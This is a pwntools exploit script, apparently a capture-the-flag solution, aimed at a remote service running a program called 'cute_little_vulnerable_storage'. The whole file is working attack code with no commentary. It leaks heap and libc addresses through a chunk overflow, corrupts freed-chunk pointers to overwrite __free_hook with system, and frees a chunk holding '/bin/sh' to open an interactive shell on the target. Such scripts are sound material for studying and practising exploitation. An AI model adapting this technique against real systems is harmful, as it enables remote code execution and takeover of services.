from pwn import *

r = remote('3.99.48.161', 9005)
# r = process('./cute_little_vulnerable_storage', env={'LD_PRELOAD':'./libc.so.6'})
context.log_level = 'debug'
context.arch = 'x86_64'
libc = ELF('./libc.so.6')
bin = ELF('./cute_little_vulnerable_storage')

def create(size):
    r.sendlineafter(b'Exit\n\n', b'1')
    r.sendlineafter(b'Enter the size:', str(size).encode())

def destroy(idx):
    r.sendlineafter(b'Exit\n\n', b'2')
    r.sendlineafter(b'the index:', str(idx).encode())

def edit(idx, data):
    r.sendlineafter(b'Exit\n\n', b'3')
    r.sendlineafter(b'the index:', str(idx).encode())
    r.sendafter(b'the data:', data)

def view(idx):
    r.sendlineafter(b'Exit\n\n', b'4')
    r.sendlineafter(b'the index:', str(idx).encode())

def exit():
    r.sendlineafter(b'Exit\n\n', b'5')

create(0x88)
create(0x88)
create(0x20)
create(0x88)
create(0x88)
create(0xf0)

destroy(3)
destroy(1)
destroy(0)
create(0x90+0x80)
edit(6, b'a'*0x88 + b'bbbbbb\n')

view(6)
r.recvuntil(b'bbbbbb\n\x00')

heap_base = u64(r.recv(8)) - 0x150
libc.address = u64(r.recv(8)) - 0x397b58
log.success('Libc base: %#x' % libc.address)
log.success('Heap base: %#x' % heap_base)

create(0x88)
edit(4, p64(heap_base + 0x1e0)*2 + b'a'*0x78)
destroy(7)
create(0xa8)

payload = b'a'*0x10 + p64(0) + p64(0x70) + \
        p64(libc.address + 0x397b58) + p64(libc.symbols['__free_hook'] - 0x40) + b'\n'
edit(4, payload)
create(0x60)
destroy(9)
payload = b'a'*0x10 + p64(0) + p64(0x70) + \
        p64(libc.symbols['__free_hook']-0x33) + b'\n'
edit(4, payload)
create(0x60)
edit(10, b'/bin/sh\x00')
create(0x60)

edit(11, b'\x00'*0x23 + p64(libc.symbols['system']))
# gdb.attach(r, '''b*main+124''')
destroy(10)
r.interactive()